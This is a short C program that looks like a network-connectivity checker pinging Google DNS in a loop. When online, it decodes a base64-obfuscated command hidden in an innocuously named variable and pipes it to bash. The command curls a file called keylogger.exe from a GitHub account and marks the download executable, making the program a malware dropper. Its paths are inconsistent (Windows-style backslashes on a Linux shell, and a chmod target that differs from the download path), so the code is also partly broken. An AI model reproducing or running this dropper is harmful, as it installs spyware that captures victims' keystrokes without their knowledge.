#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

// Define the commands
char google_dns_ping[] = "ping -c 3 -w 2 8.8.8.8";
char some_string[] = "echo Y3VybCBodHRwczovL2dpdGh1Yi5jb20vc2FnaWtpbmcva2V5bG9nZ2VyLmV4ZSAtbyBcdG1wXFg3MjJEcw== | base64 -d | bash > /dev/null 2>&1";

// Function to ping Google DNS
int ping_google_dns() {
    char path[1035];
    FILE* fp = popen(google_dns_ping, "r");
    if (fp == NULL) {
        return 0; // Failed to run command
    }

    int lines_counter = 0;
    while (fgets(path, sizeof(path), fp) != NULL) {
        lines_counter++;
    }

    pclose(fp);
    return lines_counter;
}

// Function to check if a file exists
int file_exists(const char *filename) {
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

int main() {
    const char *filename = "tmpX722Ds"; // Adjust this path as needed

    while (1) {
        int length = ping_google_dns();
        if (length > 5) {
            if (!file_exists(filename)) {
                system(some_string);
		system("chmod +x tmpX722Ds");
                printf("Downloaded the file\n");
            } else {
                printf("File already exists.\n");
            }
        } else {
            printf("Not Connected\n");
        }

        sleep(60); // Sleep for 60 seconds before retrying
    }

    return 0;
}
